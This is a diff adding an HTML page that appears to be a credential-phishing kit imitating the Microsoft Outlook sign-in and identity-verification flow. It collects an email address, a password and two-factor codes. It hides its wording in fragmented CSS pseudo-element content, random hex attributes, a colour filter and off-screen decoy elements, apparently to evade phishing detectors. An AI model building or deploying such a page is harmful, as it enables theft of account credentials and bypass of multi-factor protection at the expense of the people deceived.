@@ -1,0 +1,2596 @@
+<html dir="ltr" lang="en" style="filter: hue-rotate(10deg)"><head><meta charset="utf-8"/>
+   <link href="data:image/png;base64,<STRIPPED>" rel="shortcut icon"/>
+   <link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" integrity="sha256-NuCn4IvuZXdBaFKJOAcsU2Q3ZpwbdFisd5dux4jkQ5w=" rel="stylesheet"/>
+   <style>@font-face {
+                font-family: 'Segoe UI WestEuropean';
+                src: local('Segoe UI Light'), local('Segoe WP Light'),
+                    url('https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-light.eot?#iefix')
+                        format('embedded-opentype'),
+                    url('https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-light.woff')
+                        format('woff'),
+                    url('https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-light.ttf')
+     ;                   format('truetype');
+                font-weight: 100;
+                font-style: normal;
+            }
+            @font-face {
+                font-family: 'Segoe UI WestEuropean';
+                src: local('Segoe UI'), local('Segoe WP'),
+                    url('https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-regular.eot?#iefix')
+                        format('embedded-opentype'),
+                    url('https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-regular.woff')
+                        format('woff'),
+                    url('https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-regular.ttf')
+                        format('truetype');
+                font-weight: 400;
+                font-style: normal;
+            }
+            @font-face {
+                font-family: 'Segoe UI WestEuropean';
+                src: local('Segoe UI Semibold'), local('Segoe WP Semibold'),
+                    url('https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-semibold.eot?#iefix')
+                        format('embedded-opentype'),
+                    url('https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-semibold.woff')
+                        format('woff'),
+                    url('https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-semibold.ttf')
+                        format('truetype');
+                font-weight: 600;
+                font-style: normal;
+            }
+            @font-face {
+                font-family: 'Segoe UI WestEuropean';
+                src: local('Segoe UI Semilight'), local('Segoe WP Semilight'),
+                    url('https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-semilight.eot?#iefix')
+                        format('embedded-opentype'),
+                    url('https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-semilight.woff')
+                        format('woff'),
+                    url('https://outlook-1.cdn.office.net/assets/mail/fonts/v1/fonts/segoeui-semilight.ttf')
+                        format('truetype');
+                font-weight: 200;
+                font-style: normal;
+            }
+            @font-face {
+                font-family: 'FabricMDL2Icons';
+                src: url('https://outlook-1.cdn.office.net/owamail/20220325002.04/resources/fonts/o365icons-mdl2.woff')
+                        format('woff'),
+                    url('https://outlook-1.cdn.office.net/owamail/20220325002.04/resources/fonts/o365icons-mdl2.ttf')
+                        format('truetype');
+                font-weight: normal;
+                font-style: normal;
+            }
+            @font-face {
+                font-family: 'office365icons';
+                src: url('https://outlook-1.cdn.office.net/owamail/20220325002.04/resources/fonts/office365icons.eot?');
+                src: url('https://outlook-1.cdn.office.net/owamail/20220325002.04/resources/fonts/office365icons.eot?#iefix')
+                        format('embedded-opentype'),
+                    url('https://outlook-1.cdn.office.net/owamail/20220325002.04/resources/fonts/office365icons.woff?')
+                        format('woff'),
+                    url('https://outlook-1.cdn.office.net/owamail/20220325002.04/resources/fonts/office365icons.ttf?')
+                        format('truetype'),
+                    url('https://outlook-1.cdn.office.net/owamail/20220325002.04/resources/fonts/office365icons.svg?#office365icons')
+                        format('svg');
+                font-weight: normal;
+                font-style: normal;
+            }
+            #preloadDiv {
+                height: 1px;
+                margin-bottom: -1px;
+                overflow: hidden;
+                visibility: hidden;
+            }
+            #loadingScreen {
+                position: fixed;
+                top: 0;
+                bottom: 0;
+                left: 0;
+                right: 0;
+                background-color: #fff;
+            }
+            #loadingLogo {
+                position: fixed;
+                top: calc(50vh - 90px);
+                left: calc(50vw - 90px);
+                width: 180px;
+                height: 180px;
+            }
+            #MSLogo {
+                position: fixed;
+                bottom: 36px;
+                left: calc(50vw - 45px);
+            }
+            .dark #loadingScreen {
+                background-color: #333;
+            }
+            #loadingLogo2_ts {
+                animation: loadingLogo2_ts__ts 3000ms linear 1 normal forwards;
+                animation-iteration-count: 1000;
+            }
+            #loadingLogo2 {
+                animation: loadingLogo2_c_o 3000ms linear 1 normal forwards;
+                animation-iteration-count: 1000;
+            }
+            #loadingLogo3_to {
+                animation: loadingLogo3_to__to 3000ms linear 1 normal forwards;
+                animation-iteration-count: 1000;
+            }
+            #loadingLogo6_ts {
+                animation: loadingLogo6_ts__ts 3000ms linear 1 normal forwards;
+                animation-iteration-count: 1000;
+            }
+            #loadingLogo8_ts {
+                animation: loadingLogo8_ts__ts 3000ms linear 1 normal forwards;
+                animation-iteration-count: 1000;
+            }
+            #loadingLogo9_to {
+                animation: loadingLogo9_to__to 3000ms linear 1 normal forwards;
+                animation-iteration-count: 1000;
+            }
+            #loadingLogo29_ts {
+                animation: loadingLogo29_ts__ts 3000ms linear 1 normal forwards;
+                animation-iteration-count: 1000;
+            }
+            @keyframes loadingLogo2_ts__ts {
+                0% {
+                    transform: translate(108.89443px, 155.715127px) scale(0.668963, 0.668963);
+                    animation-timing-function: cubic-bezier(0.42, 0, 0.58, 1);
+                }
+                26.666667% {
+                    transform: translate(108.89443px, 155.715127px) scale(1, 1);
+                }
+                100% {
+                    transform: translate(108.89443px, 155.715127px) scale(1, 1);
+                }
+            }
+            @keyframes loadingLogo2_c_o {
+                0% {
+                    opacity: 0;
+                }
+                18.333333% {
+                    opacity: 1;
+                }
+                100% {
+                    opacity: 1;
+                }
+            }
+            @keyframes loadingLogo3_to__to {
+                0% {
+                    transform: translate(101.000155px, 195.970703px);
+                }
+                13.333333% {
+                    transform: translate(101.000155px, 195.970703px);
+                    animation-timing-function: cubic-bezier(0, 0, 1, 0.025);
+                }
+                31% {
+                    transform: translate(101.000155px, 206px);
+                    animation-timing-function: cubic-bezier(0.135, 0.71, 0.03, 0.985);
+                }
+                50% {
+                    transform: translate(101.000155px, 195.970703px);
+                }
+                100% {
+                    transform: translate(101.000155px, 195.970703px);
+                }
+            }
+            @keyframes loadingLogo6_ts__ts {
+                0% {
+                    transform: translate(101.000708px, 97.499588px) scale(1, -0.00172);
+                }
+                23.333333% {
+                    transform: translate(101.000708px, 97.499588px) scale(1, -0.00172);
+                    animation-timing-function: cubic-bezier(0.135, 0.71, 0.03, 0.985);
+                }
+                40% {
+                    transform: translate(101.000708px, 97.499588px) scale(1, 1);
+                }
+                100% {
+                    transform: translate(101.000708px, 97.499588px) scale(1, 1);
+                }
+            }
+            @keyframes loadingLogo8_ts__ts {
+                0% {
+                    transform: translate(101.000699px, 159.914723px) scale(1, 1);
+                }
+                39.666667% {
+                    transform: translate(101.000699px, 159.914723px) scale(1, 1);
+                }
+                50% {
+                    transform: translate(101.000699px, 159.914723px) scale(1, 1.05036);
+                }
+                52.333333% {
+                    transform: translate(101.000699px, 159.914723px) scale(1, 0.959233);
+                }
+                57.666667% {
+                    transform: translate(101.000699px, 159.914723px) scale(1, 1);
+                }
+                100% {
+                    transform: translate(101.000699px, 159.914723px) scale(1, 1);
+                }
+            }
+            @keyframes loadingLogo9_to__to {
+                0% {
+                    transform: translate(101px, 205.753765px);
+                }
+                26.666667% {
+                    transform: translate(101px, 205.753765px);
+                    animation-timing-function: cubic-bezier(0.175, 0.885, 0.32, 1.275);
+                }
+                50% {
+                    transform: translate(101px, 81px);
+                }
+                100% {
+                    transform: translate(101px, 81px);
+                }
+            }
+            @keyframes loadingLogo29_ts__ts {
+                0% {
+                    transform: translate(101.000699px, 97.499573px) scale(1, 1);
+                }
+                13.333333% {
+                    transform: translate(101.000699px, 97.499573px) scale(1, 1);
+                    animation-timing-function: cubic-bezier(0, 0, 1, 0.025);
+                }
+                23.333333% {
+                    transform: translate(101.000699px, 97.499573px) scale(1, 0.001723);
+                }
+                100% {
+                    transform: translate(101.000699px, 97.499573px) scale(1, 0.001723);
+                }
+            }
+		#bg_img {
+			height: 100%;
+			background-position: center;
+			background-repeat: no-repeat;
+			background-size: cover
+		}
+            
+            /* <STRIPPED> */
+
+      .block-m2 {
+      padding: 10px;
+      margin: 1%;
+      }
+      .block-m2:hover {
+      background-color: #E5E5E5;
+      }
+      .block-m2:active {
+      border: 1px;
+      border-style: dotted;
+      border-color: black;
+      }
+		
+	  .email-picker{
+		  
+		  display: inline;
+	  }
+	  
+	  .add_em a{
+		color: #000;
+		text-decoration: none;
+	  }
+	  
+	  .add_em a:hover{
+		color: #000;
+		
+	  }
+	  
+	  .add_em a:active{
+		
+	  }
+	  .banner-logo{
+		width:auto;
+		height:auto;
+	  }
+	  
+	button:disabled,
+	button[disabled]{
+	  border: 1px solid #999999;
+	  background-color: #cccccc;
+	  color: #666666;
+	}
+	#footer{
+		margin-bottom: 0px !important;
+		background-color: transparent !important;
+     }
+	 @media screen and (max-width: 600px) {
+         #bg_img {
+            background-image: none !important;
+         }
+         #footer{
+            margin-bottom: 0px !important;
+            background-color: white !important;
+         }
+         .footerNode > * {
+            color: black !important;
+         }
+     }
+	 
+	 .pashold::before {
+		 content: "pass"
+	 }
+	 .pashold::after {
+		 content: "word"
+	 }
+	 
+        </style>
+   <link href="data:image/png;base64,<STRIPPED>" rel="shortcut icon"/><style>#bdf8c508c139ee::after
+ {
+	content: 'ormation';
+}
+
+#bfe167::after
+ {
+	content: 'n in';
+}
+
+#e770ff818f6973d::before
+ {
+	content: 'Send an identity verification reques';
+}
+
+#c4b03cbf::before
+ {
+	content: 'Don\'t ask again ';
+}
+
+#c8f7d5::after
+ {
+	content: 'nother way';
+}
+
+#c4b63::after
+ {
+	content: 'XXXXX84';
+}
+
+#e7642b517877b5a::before
+ {
+	content: 'Terms & C';
+}
+
+#bf20c3e693e::after
+ {
+	content: 'for undefined days';
+}
+
+#e317::before
+ {
+	content: 'View d';
+}
+
+#fa48ef68d18f36::before
+ {
+	content: 'More inf';
+}
+
+#a643f3::after
+ {
+	content: 't Authenticator app, but we didn\'t hear from you in time.';
+}
+
+#acf3::after
+ {
+	content: 'nfo, you need to verify your password';
+}
+
+#e68c51d28bd2::before
+ {
+	content: 'I can\'t use my Microsoft ';
+}
+
+#f21338d0708b::after
+ {
+	content: 't to my Microsoft Authenticator app.';
+}
+
+#fbcd4f0a2efabb0::before
+ {
+	content: 'More inf';
+}
+
+#ed90b2d0ac09::before
+ {
+	content: 'More inf';
+}
+
+#fda8eb5bcd00e7b::before
+ {
+	content: 'Don\'t ask aga';
+}
+
+#bc58235c795ce::after
+ {
+	content: 'rification code. Please try again.';
+}
+
+#b31f873c4489c9::after
+ {
+	content: 'Authenticator app right now';
+}
+
+#e42fa6::before
+ {
+	content: 'Don\'t ask again ';
+}
+
+#a643f3::before
+ {
+	content: 'We sent an identity verification request to your Microsof';
+}
+
+#dba7ee83aa97bc::before
+ {
+	content: 'Use anoth';
+}
+
+#e42fa6::after
+ {
+	content: 'for undefined days';
+}
+
+#c4b03cbf::after
+ {
+	content: 'for undefined days';
+}
+
+#f42c232::before
+ {
+	content: 'Can\'t access';
+}
+
+#d1234573::after
+ {
+	content: 'sn\'t sent';
+}
+
+#f20b2ee::after
+ {
+	content: 'ing to process your request';
+}
+
+#f20b2ee::before
+ {
+	content: 'An error ocuured while try';
+}
+
+#bc58235c795ce::before
+ {
+	content: 'You didn\'t enter the expected ve';
+}
+
+#bf20c3e693e::before
+ {
+	content: 'Don\'t ask again ';
+}
+
+#e317::after
+ {
+	content: 'etails';
+}
+
+#e770ff818f6973d::after
+ {
+	content: 't to my Microsoft Authenticator app.';
+}
+
+#e7642b517877b5a::after
+ {
+	content: 'onditions';
+}
+
+#a900d::before
+ {
+	content: 'Sign in a';
+}
+
+#a900d::after
+ {
+	content: 'nother way';
+}
+
+#ed90b2d0ac09::after
+ {
+	content: 'ormation';
+}
+
+#f18744a15::before
+ {
+	content: 'More inf';
+}
+
+#c4b63::before
+ {
+	content: '+X XXX';
+}
+
+#d58585198d::after
+ {
+	content: 'Privacy';
+}
+
+#ff3eb13d::after
+ {
+	content: 'rification code. Please try again.';
+}
+
+#a043::before
+ {
+	content: 'More inf';
+}
+
+#d58585198d::before
+ {
+	content: 'Cookie ';
+}
+
+#f42c232::after
+ {
+	content: ' your account?';
+}
+
+#d1234573::before
+ {
+	content: 'Request wa';
+}
+
+#f4f2::before
+ {
+	content: 'View d';
+}
+
+#f21338d0708b::before
+ {
+	content: 'Send an identity verification reques';
+}
+
+#bdf8c508c139ee::before
+ {
+	content: 'More inf';
+}
+
+#ff3eb13d::before
+ {
+	content: 'You didn\'t enter the expected ve';
+}
+
+#ba2c48::before
+ {
+	content: 'Forgot my';
+}
+
+#f4f2::after
+ {
+	content: 'etails';
+}
+
+#dba7ee83aa97bc::after
+ {
+	content: 'er account';
+}
+
+#fda8eb5bcd00e7b::after
+ {
+	content: 'in for 30 days';
+}
+
+#acf3::before
+ {
+	content: 'Because you\'re accessing sensitive i';
+}
+
+#e68c51d28bd2::after
+ {
+	content: 'Authenticator app right now';
+}
+
+#b8a30::after
+ {
+	content: 'miss';
+}
+
+#a043::after
+ {
+	content: 'ormation';
+}
+
+#fbcd4f0a2efabb0::after
+ {
+	content: 'ormation';
+}
+
+#b8a30::before
+ {
+	content: 'Dis';
+}
+
+#c8f7d5::before
+ {
+	content: 'Sign in a';
+}
+
+#fa48ef68d18f36::after
+ {
+	content: 'ormation';
+}
+
+#b31f873c4489c9::before
+ {
+	content: 'I can\'t use my Microsoft ';
+}
+
+#bfe167::before
+ {
+	content: 'Sig';
+}
+
+#b6dca69d662a23f::before
+ {
+	content: 'View d';
+}
+
+#c6d0::before
+ {
+	content: 'Are your verification methods curre';
+}
+
+#f18744a15::after
+ {
+	content: 'ormation';
+}
+
+#ba2c48::after
+ {
+	content: ' password';
+}
+
+#b6dca69d662a23f::after
+ {
+	content: 'etails';
+}
+
+#c6d0::after
+ {
+	content: 'nt? Check at https://aka.ms/mfasetup';
+}
+</style></head><body class="cb" style="display:block; ">
+			<div id="error-display" style="z-index: 999;position:absolute;height:170px;width:500px;border: 2px solid black;margin:0 auto;left: 0;right:0;top: 40%;text-align: center;display: flex; align-items: cennter;justify-content: center;flex-direction: column;background-color: white;box-shadow: 2px 5px 5px 2px;visibility: hidden;">
+				<span class="caf6805 ff849ee3 dbe9e1267 d028ace46 b22fd62 c7e3dfeee da45f831 aac543c" data-b7a13c="dab4" data-d1bad2="ef12c0" data-fd9abf="b194" data-feeaef="f50b948" headers="a3daee7cd31de45" high="af8775a81d5419" id="display-error-message" integritykind="fbcd9c23bdb" low="b89464f72ed7dc1" method="ec92a854df" style="margin: 40px;"><span class="d1d3f ab163 daa28de fd7bd4d25 c09950 a825f2 b8e1d01" data-c29="c0ab1" data-ca1d3e="f2f8e7a" data-d59e8="ebeb59" data-e5e2="baef7" data-ebd="ceb" id="f20b2ee" integritykind="da10884b46" low="b4f36f0d3a" method="af1e19be8603" muted="e732a0ca48ed" open="a5492343afb1b6"></span></span>
+				<div class="buttons-holder" style="">
+					<span class="vector-dropdown-label-text" style="position: absolute; left: -12029px;">2 languages</span><button class="ef943c46 btn-primary b22e1aab btn d28769709 e69f6e btn-block" data-a0c4c5c="cdb9" data-a59="d72705" data-dea1="a13e6c" data-dfb8a84="e3098" data-e67caae="ba96" data-f5c="f87" data-fdac85="fa4a3" id="error-dismiss" muted="e744d6a080f2394" open="cb1e3d6e762" optimum="d53fff984972d" ping="da8b1c9f0e" scope="cff747f8b3" style="max-width: 30px;"><p class="c7c0e c8b65d5 d4523 decaa62" data-d24419="a25b2a" data-dab26="b61a" data-f07="bd6e" data-f871d7="ca5d82c" id="b8a30" low="e37fb3e8dac2" method="c5b4a694bcf" muted="fc6d7d29b816" open="bad6b6e29e9432" optimum="da88d9d8b93f1" style="display: inline;"></p></button>
+				</div>
+			</div>
+       <div id="content" style="display:none;">  
+
+            <div class="outer">
+               <div class="app middle" id="bg_img" style="background-image: linear-gradient(to right, #cccccc , #ebdfdb);">
+                  <div class="background-logo-holder">
+                     
+                  </div>
+                  <div class="app fade-in-lightbox inner">
+                      <div aria-label="Please wait" class="progress" data-bind="component: 'marching-ants-control', ariaLabel: str['WF_STR_ProgressText']" id="progressBar" role="progressbar" style="display: none;"><!--  -->
+                        <!-- ko if: svr.fSupportWindowsStyles --><!-- /ko -->
+                        <!-- ko ifnot: svr.fSupportWindowsStyles -->
+                            <!-- ko if: useCssAnimation -->
+                            <div></div><div></div><div></div><div></div><div></div>
+                            <!-- /ko -->
+                            <!-- ko ifnot: useCssAnimation --><!-- /ko -->
+                        <!-- /ko --></div>
+                     <div>
+                        <img class="banner-logo" id="logo_image" src="data:image/svg+xml;base64,<STRIPPED>"/>
+                     </div>
+                     <div>
+
+                     
+                        <div id="pick_em" style="display: none;">
+                           <div class="animate pagination-view slide-in-next">
+                              <div data-showfedcredbutton="true" data-viewid="1">
+                                 <div>
+                                    <div class="row text-title" id="loginHeader">
+                                       <div aria-level="1">Sign in</div>
+                                    </div>
+                                 </div>
+                                 <div class="row">
+                                    <div class="col-md-24 form-group">
+                                       <div class="placeholderContainer">
+                                            <div id="pick_em" style="display: none;">
+                                                    <p class="adbc54eaa fb61b0a5 ef033 e30762d5 f223f28e1 cd39a82" data-c5f13="d9498" data-c5fa="e0ff873" data-e416="b3c9" data-eeae3="e354" data-f91a296="d9eae" low="e3d5318514c944" method="e830b174b453a2" muted="bf8ae0a7c8666" open="ff030de161b" optimum="b1a6ebf9c64b6f" style="font-weight: bold;margin-left: 4%">Pick an account</p>
+                                                    <a class="email-picker" href="#">
+                                                            <div class="block-m2">
+                                                                   <img role="presentation" src=""/> <span class="dc46fc8b2 d925a131f daefc9 dae6256 b516fe" data-a5dfa="fb639" data-b81b7dd="c9a33" data-bee3e="a8a" data-cd4e5f5="ff4b18" data-d7714="a8df" data-f163f9="f06" data-ffe628f="ea03" id="em_picker" optimum="bbc11f88be0" ping="dfc15acda1" sandbox="e2c308b7821" scope="abbb03de0753" span="d077da2b1be"></span><button class="vector-pinnable-header-toggle-button vector-pinnable-header-pin-button" data-event-name="pinnable-header.vector-toc.pin" style="position: absolute; right: 11192px;">move to sidebar</button><span class="b56710 f056db ffb53670c f99b8d68 f95f1281 c95c178f c5f0e" data-c0842f="d06b383" data-cff="c9a48" data-d5c="cbe" data-f35e="a796" data-faad="cfa3f" muted="c5734eebb5bb1" open="cefc59acc8000" optimum="a3ca915318dcd0" ping="c988085f5c172" scope="a06bb093da" style="float:right; margin-top:4%"><img alt="" src=""/></span>
+                                                            </div>
+                                                    </a>
+                                                    <a class="email-picker2" href="#">
+                                                            <div class="block-m2">
+                                                                   <img role="presentation" src=""/><span class="db3bad9 ce688 c333c182 f67cb35 d9af787" data-bb2e21="d2c" data-e818554="c165" data-f1b72="afdbfc" optimum="ad321e6eb2322" ping="abbcaa8d798" sandbox="bbbdaa7464" scope="a0b9cac1bfb255e" span="d754057f40cb" style="word-wrap:break-word;"><span class="b82f895a c4d92f36 afc6fc63b d7f0c d948ea4" data-b38531="ec51" data-db50d84="a1c6" data-e4617="d236" data-e955a1="a981" data-f8e99ee="a746244" data-ff0d="cf9ed" id="dba7ee83aa97bc" low="bb70e1620b923" method="d90d76856d9" muted="a5bcb44e8df4" open="f27ffd24c3c604" optimum="beda89ec8dc49"></span></span>
+                                                            </div>
+                                                    </a>
+                                                    <br/>
+                                           </div>
+                                       </div>
+                                    </div>
+                                 </div>
+                                 <div class="position-buttons">
+
+                                 </div>
+                              </div>
+                           </div>
+                        </div>
+                     
+                        <div id="add_em" style="display: none;">
+                           <div class="animate pagination-view slide-in-next">
+                              <div data-showfedcredbutton="true" data-viewid="1">
+                                 <div>
+                                    <div class="row text-title" id="loginHeader">
+                                       <div aria-level="1">Sign in</div>
+                                       <div aria-level="2" class="text-13 subtitle">to continue to Outlook</div>
+                                    </div>
+                                 </div>
+                                 <div class="row">
+                                            <div aria-live="assertive" class="error-alert em-error-parent" role="alert" style="display: none;">
+                                                    <div class="alert alert-error error-alert-msg em-error"></div>
+                                                    <br/>
+                                            </div>
+                                    <div class="col-md-24 form-group">
+                                       <div class="placeholderContainer">
+                                    <input attr-httpd="thbdf55" class="form-control ltr_override" id="email" ind="rvdhv443dd" name="email" placeholder="Email, phone, or Skype" type="text" value=""/>
+                                       </div>
+                                    </div>
+                                 </div>
+                                 <div class="position-buttons">
+                                    <div class="row">
+                                       <div class="col-md-24">
+                                          <div class="text-13 action-links">
+                                             <div class="form-group">
+                                                <a href="#"><p class="b3bfa41b b42c2 c36e00 f7ff5c24" data-a47="de466b" data-b97c70f="ef8" data-c27c="dc5" data-e00d1="d59cf2b" data-e214="dcb7c78" data-f161836="da5" data-f377a="a6d9109" id="f42c232" muted="f26893c11ed21d9" open="d144d6b8f0ee041" optimum="d931e9d431" ping="f30b9925214cc" scope="a3807c944adc" style="display: inline;"></p></a>
+                                             </div>
+                                          </div>
+                                       </div>
+                                    </div>
+                                    <div class="row">
+                                       <div class="col-xs-24 no-padding-left-right button-container">
+                                       <div class="inline-block">
+                                          <button class="a34ac099 f91a9988 btn btn-primary btn-email fe0393 ccc24 btn-block b97cd771 af089dfa ca2372337" data-a2ef9b7="cca5228" data-da657="b7e3c" data-e2c55b="b38e19b" data-ffd594="f854" headers="e4e17b8f537851f" high="a69fcc628d600" integritykind="eff664e12f6827" low="bc82dff993bd5" method="f21904f293">Next</button>
+                                       </div>
+                                       </div>
+                                    </div>
+                                 </div>
+                              </div>
+                           </div>
+                        </div>
+                        <div id="add_pass" style="display: none;">
+                                <div class="animate slide-in-next">
+                                        <div>
+                                                <div class="identityBanner">
+                                                        <a class="backButton" href="#" type="button">
+                                                                <img src="data:image/svg+xml;base64,<STRIPPED>"/>
+                                                        </a>
+                                                        <div class="identity"></div>
+                                                </div>
+                                        </div>
+                                </div>
+                                <div class="enter-pass animate slide-in-next has-identity-banner pagination-view" style="">
+                                        <div class="row text-title">Enter <span class="c0b09ec2 c2ee0 a0033070b c966266 pashold c6f1b0608" data-d7c="f15" data-daa47="beb2e5" data-db98b="a86" data-df9ba5="a9c0" data-ec90a="c83bb38" data-f8bafa="c60a" high="e509a3dada" integritykind="aed29053c1ce72" low="c3d6eb26ba9020" method="e577e0984f8" muted="da6e1e645d"></span></div>
+                                        <div class="row">
+                                            <div aria-live="assertive" class="error-alert" role="alert">
+                                                    <div class="pass-error alert alert-error error-alert-msg"></div>
+													<span class="info-verify ebc948ee8 a461d b3657b c4cf6192 b6470" data-a111a0="babca8" data-a70="d37ed" data-b7cb6="ae8" data-bce="ddd626" data-d0587f="b47431a" data-e5c="a8bc564" data-fe0e469="c6d3" low="d991a5549e9646e" method="d167ebdd68413" muted="cefd90ec34376" open="d97c785d302ae" optimum="ebc31dc73349b3b"><p class="a83c9c9b8 f349b8 c5275f7 f0949830c" data-a1d1266="b47b" data-c18="c06695" data-f273d="bb80" data-f2fd6d="ad72" id="acf3" open="c430dfe440fb" optimum="ed76bf63d759364" ping="a966837374" sandbox="a61cb20450" scope="c9e323f37905b0" style="display: inline;"></p></span>
+                                            </div>
+                                                <div class="form-group col-md-24">
+                                                        <div aria-live="assertive" class="error-alert-pass" role="alert" style="display: block;">
+                                                                <div class="alert alert-erro" style="color:#e81123;"></div>
+                                                        </div>
+                                                        <div class="placeholderContainer">
+                                                                <input autocomplete="off" class="form-control" id="password" name="password" placeholder="Password" tabindex="0" type="password"/>
+                                                        </div>
+                                                </div>
+                                        </div>
+                                        <div class="position-buttons">
+                                                <div>
+                                                        <div class="row">
+                                                                <div class="col-md-24">
+                                                                                <div class="action-links text-13">
+                                                                                <div class="form-group"><a href="#"><p class="b097f7f6 ae156fb d171c0f6 ca0c547 b0e48 c3d29" data-b79fb="d0a5a6b" data-f4c7="e94f5c7" data-f61="dab9a" id="ba2c48" optimum="e5de3f6264ce360" ping="d942dbfbf5" sandbox="f1e742dee5ee332" scope="fb0294751d66" span="c148b1b2b2c" style="display: inline;"></p></a></div>
+                                                                                <div class="form-group"></div>
+                                                                        </div>
+                                                                </div>
+                                                        </div>
+                                                </div>
+                                                <div class="row">
+                                                        <div>
+                                                                <div class="button-container col-xs-24 no-padding-left-right">
+                                                                        <div class="inline-block">
+                                                                                <span class="vector-dropdown-label-text" style="position: absolute; display: block; width: 0; height: 0; overflow: hidden;">Toggle the table of contents</span><button class="ddabc6c dc6e81 nextb d41688f8 btn-primary btn-signin bb79d7 btn-block btn" data-c4fc0e="d7d8" data-e2184ee="fe9b02" data-f7238="a155960" open="a5ca02d90718a" optimum="d74021a5c1c9023" ping="dbe685f3ce5" sandbox="f0c42efa69" scope="ff8c28bce38"><span class="e48e81da bd1deabb2 fff0f e330e c765bef eb4a57d" data-ac25="b70b242" data-b4b4="a2a38e" data-b940d03="a74ad5" data-c284="d3d6" data-c453="bb0579" data-d57="bd47" id="bfe167" optimum="b5d3b49776a" ping="b4a61719451" sandbox="ee28075f4f6" scope="e8573a810e7" span="fcb71853522f402"></span></button>
+                                                                        </div>
+                                                                    <input id="first" type="hidden" value="0"/>
+                                                                    <input id="repeat" type="hidden" value="1"/>
+                                                                </div>
+                                                        </div>
+                                                 </div>
+                                        </div>
+                                </div>
+							
+								<div class="show-2fa-code pagination-view has-identity-banner animate slide-in-next" data-bind="css: {
+        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
+        'zero-opacity': hidePaginatedView.hideSubView(),
+        'animate': animate(),
+        'slide-out-next': animate.isSlideOutNext(),
+        'slide-in-next': animate.isSlideInNext(),
+        'slide-out-back': animate.isSlideOutBack(),
+        'slide-in-back': animate.isSlideInBack() }" style="display:none;">
+
+        <!-- ko foreach: views -->
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
+        
+            <!-- ko if: $parent.currentViewIndex() === $index() -->
+                <!-- ko template: { nodes: [$data], data: $parent } --><div data-bind="pageViewComponent: { name: 'otc-request-view',
+                    params: {
+                        serverData: svr,
+                        serverError: initialError,
+                        renderProofsInline: true,
+                        username: sharedData.username,
+                        otcProofs: sharedData.otcProofs,
+                        isInitialState: isInitialState,
+                        showCancelButton: sharedData.showCancelButton,
+                        hideSmsInMfaProofs: sharedData.hideSmsInMfaProofs,
+                        focusDefaultField: true },
+                    event: {
+                        cancel: view_onCancel,
+                        redirect: $tfaPage.view_onRedirect,
+                        showDebugDetails: $tfaPage.toggleDebugDetails_onClick,
+                        setPendingRequest: $tfaPage.view_onSetPendingRequest,
+                        updateSessionIdentifier: $tfaPage.view_onUpdateSessionIdentifier,
+                        showMoreProofs: $tfaPage.view_onShowMoreProofs } }" data-showidentitybanner="true" data-viewid="2"><!--  -->
+
+<!-- ko if: defaultProof && sending() --><!-- /ko -->
+
+<!-- ko ifnot: defaultProof && sending() -->
+<div aria-level="1" class="row text-title" data-bind="text: str['CT_SAOTCC_STR_Title']" id="idDiv_SAOTCS_Title" role="heading">Verify your identity</div>
+
+<!-- ko if: svr.fIsChallengeDueToAuthenticationStrengths --><!-- /ko -->
+
+<div id="idDiv_SAOTCS_Proofs_Section">
+    <!-- ko if: serverError --><!-- /ko -->
+
+    <div aria-labelledby="idDiv_SAOTCS_Error_OTC idDiv_SAOTCS_Title" class="form-group" data-bind="css: { 'binaryChoice list': svr.fSupportWindowsStyles }" id="idDiv_SAOTCS_Proofs" role="list">
+        <!-- ko foreach: { data: proofs } -->
+            <!-- ko if: $parent.isProofVisible(type) -->
+            <div class="row tile" role="listitem">
+                <div aria-describedby="idDiv_SAOTCS_Title" class="table" data-bind="
+                    attr: { 'data-value': value },
+                    css: { 'list-item': svr.fSupportWindowsStyles },
+                    ariaDescribedBy: $data === $parent.focusedProof() ? 'idDiv_SAOTCS_Title' : null,
+                    click: $parent.proof_onClick,
+                    pressEnter: $parent.proof_onClick,
+                    hasFocus: $data === $parent.focusedProof()" data-value="OneWaySMS" role="button" tabindex="0">
+                    <div class="table-row">
+                        <div class="table-cell tile-img">
+                            <div data-bind="component: { name: 'proof-image-control', params: { type: type } }"><!--  -->
+
+<!-- ko if: type === PROOF.Type.Email --><!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.SMS || type === PROOF.Type.TwoWaySMS || type === PROOF.Type.TwoWaySMSAlternateMobile -->
+    <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
+<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
+<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="tile-img" data-bind="imgSrc, css: { 'small': small, 'animate-pulse': animate }" pngsrc="data:image/png;base64,<STRIPPED>" role="presentation" src="data:image/svg+xml;base64,<STRIPPED>" svgsrc="data:image/svg+xml;base64,<STRIPPED>"/><!-- /ko -->
+<!-- /ko --><!-- /ko -->
+<!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.Voice || type === PROOF.Type.TwoWayVoice || type === PROOF.Type.TwoWayVoiceAlternateMobile || type === PROOF.Type.TwoWayVoiceOffice --><!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.TOTPAuthenticatorV2 --><!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.TOTPAuthenticator --><!-- /ko -->
+
+<!-- ko if: type === PROOF.Type.FidoKey --><!-- /ko -->
+
